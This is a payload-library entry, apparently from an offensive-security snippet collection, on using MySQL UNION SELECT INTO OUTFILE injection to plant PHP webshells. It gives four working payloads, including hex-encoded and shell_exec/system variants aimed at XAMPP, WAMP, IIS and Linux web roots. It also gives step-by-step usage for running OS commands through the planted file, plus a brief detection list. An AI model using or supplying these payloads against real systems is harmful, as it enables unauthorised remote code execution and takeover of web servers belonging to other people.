---
id: a00c1363-5b34-4e21-ac33-3e53ce693fc9
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.814033+00:00'
updated_at: '2023-04-10T20:22:49.795264+00:00'
tags:
  - webshell
  - sql-injection
  - outfile
platforms:
  - Web
  - Linux
  - Windows
validated: true
---

# MySQL-Union-Select-Outfile-PHP-Shell

## Code

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

## Description

This SQL code snippet exploits MySQL's INTO OUTFILE feature via a UNION SELECT injection to write PHP webshell code to the server's filesystem. It includes variations for command execution (using system() or shell_exec()) and information disclosure (phpinfo()). The payloads target common web server paths on Windows (XAMPP, WAMP, IIS) and Linux (Apache/Nginx), enabling remote code execution once the file is accessed via HTTP.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [...] | Prefix of the original vulnerable SQL query (e.g., ' UNION SELECT) | '1' UNION SELECT |
| File Path (e.g., "C:\\xampp\\htdocs\\backdoor.php") | Target web root path for the webshell file | '/var/www/html/shell.php' |
| PHP Code (e.g., "<?php system($_GET['cmd']); ?>") | Webshell payload; customizable for different functions | "<?php eval($_POST['code']); ?>" |
| 0x... (hex) | Hex-encoded PHP for bypassing filters | 0x3c3f706870... for <?php phpinfo(); ?> |

## Usage

Inject the payload into a vulnerable input field of a web application (e.g., via Burp Suite repeater or direct URL manipulation). After injection, access the resulting PHP file (e.g., http://target.com/backdoor.php?cmd=ls) to execute OS commands. Use in red team engagements for initial RCE after discovering SQLi, or in CTFs for privilege escalation.

## Detection

- Database logs showing UNION SELECT with INTO OUTFILE or suspicious hex strings.
- Filesystem monitoring for new .php files in web directories with eval/system/shell_exec.
- Web server access logs with ?cmd= parameters or unusual GET/POST to .php files.
- WAF alerts on SQL keywords like UNION, OUTFILE, or PHP functions in queries.

## Related

- [[procedures/MySQL-Injection-Write-Shell-Using-Outfile-Method]]
